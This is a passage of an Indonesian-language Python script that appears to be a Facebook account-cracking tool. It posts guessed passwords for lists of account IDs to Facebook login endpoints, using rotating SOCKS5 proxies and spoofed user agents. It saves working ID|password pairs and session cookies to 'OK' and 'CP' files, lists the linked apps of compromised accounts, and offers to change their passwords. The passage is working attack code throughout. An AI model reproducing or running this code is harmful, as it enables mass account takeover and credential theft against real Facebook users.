2C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def validate2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = open(jai)
	ua2 = open(jai2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]CRACK[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METHOD REGULER ]--------------------#
def reguler1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]CRACK[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ CEK APLIKASI ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

def ceker(idf,pw):
	sess=requests.Session()
	data={}
	uua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
	sess.headers.update({"User-Agent":uua,"Host":"m.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"ua"})
	soup=parser(sess.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):data.update({x.get("name"):x.get("value")})
	data.update({"email":idf,"pass":pw})
	response=parser(sess.post("https://m.facebook.com"+link.get("action"),data=data).text,"html.parser")
	try:
		link2=response.find("form",{"method":"post"});listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:data2.update({x.get("name"):x.get("value")}) 
		responses=parser(sess.post("https://m.facebook.com"+link2.get("action"),data=data2).text,"html.parser")
		cek=[cek.text for cek in responses.find_all("option")]
		if len(cek)==0:pass
		else:
			for opsi in range(len(cek)):opsi.append(print("[bold white]"+cek[opsi]))
	except:pass
	if len(opsi)==0:pass
	print (' [+] Columns(opsi)')
                              
#-----------------------[ DEF CEK OPSI ]--------------------#
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
day = datetime.now().strftime("%d-%b-%Y")

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [P]
warna = random.choice(acak)
til ="\033[0m [+] "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	prints(Panel(f"""Copy Nama File Hasil Crack Di Bawah Ini Kemudian Pastekan Di Bawah Untuk Cek Opsi""",width=80,style=f"bold white"))
	for file in dirs:
		prints(Panel(f"""{(file)}""",width=80,style=f"bold white"))
	try:
		prints(Panel(f"""Copy Nama File Di Atas Kemudian Tempel Di Bawah Ini Contoh : {day}.txt""",width=80,style=f"bold white"))
		opsi()
	except IOError:
		prints(Panel(f"""Tidak Ada File Untuk Di Cek Silahkan Crack Dulu""",width=80,style=f"bold white"))
		exit()

def opsi():
	CP = ("CP/")
	romi = console.input(f" [+] Tempelkan Pilihan : ")
	if romi == "":
		prints(Panel(f""" [+] Isi Yang Benar""",width=90,style=f"bold white"))
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit(prints(Panel(f"""Nama File {(romi)} Tidak Di Temukan""",width=90,style=f"bold white")))
	prints(Panel(f"""Sebelum Melanjutkan Hidupkan Mode Pesawat Selama 10 Detik""",width=90,style=f"bold white"))
	pw=console.input(f" [+] Ubah Password Ketika Tab Yes y/n : ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2=console.input(f" [+] Masukan Password Baru : ")
		if len(pw2) <= 5:
			prints(Panel(f"""Sandi Minimal 6 Karakter""",width=90,style=f"bold white"))
		else:
			pwbaru.append(pw2)
	prints(Panel(f"""Total akun : {str(len(file_cp))}""",width=90,style=f"bold white"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		prints(Panel(f"""[{(str(nomor))}] Cek Sesi Akun = {akun}""",width=90,style=f"bold white"));jeda(0.10)
		try:
